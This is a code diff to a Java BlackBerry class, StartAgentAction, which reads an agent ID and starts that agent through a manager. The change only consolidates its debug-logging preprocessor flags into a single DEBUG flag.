@@ -46,7 +46,7 @@ public final class StartAgentAction extends SubAction {
      * @see blackberry.action.SubAction#execute(blackberry.event.Event)
      */
     public boolean execute(final Event triggeringEvent) {
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("Starting " + agentId);
         //#endif
         final AgentManager agentManager = AgentManager.getInstance();
@@ -55,8 +55,8 @@ public final class StartAgentAction extends SubAction {
         boolean ret;
 
         ret = agentManager.start(agentId);
-        
-        //#ifdef DEBUG_TRACE
+
+        //#ifdef DEBUG
         debug.trace("Started " + agentId);
         //#endif
         return ret;
@@ -72,12 +72,12 @@ public final class StartAgentAction extends SubAction {
 
         try {
             agentId = databuffer.readInt();
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("agentId: " + agentId);
             //#endif
 
         } catch (final EOFException e) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("params FAILED");
             //#endif
             return false;
